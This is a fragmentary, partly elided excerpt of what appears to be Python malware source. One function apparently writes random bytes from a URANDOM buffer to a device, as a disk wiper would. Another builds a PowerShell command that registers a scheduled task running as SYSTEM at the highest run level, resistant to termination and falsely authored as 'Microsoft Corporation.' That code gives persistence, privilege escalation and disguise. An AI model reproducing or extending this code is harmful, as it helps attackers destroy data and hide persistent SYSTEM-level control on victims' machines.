...
def write_dev(
    ...
    sz, 
    _mn = min,
    _ur = (cchar * len(URANDOM)).from_buffer(URANDOM), 
    _er = HANDLE(-1).value
):
...
def get_SYSTEM():###
    ...
    c = (
        f'$t = New-ScheduledTaskAction -Execute "{exe}" -Argument "{arg}"; '
         '$e = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -DisallowDemandStart:$false -AllowHardTerminate:$false -Priority 3; '
        f'Register-ScheduledTask -TaskName "{task}" -Action $t -Settings $e -Author "Microsoft Corporation." -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType Service -RunLevel Highest) -Force; '
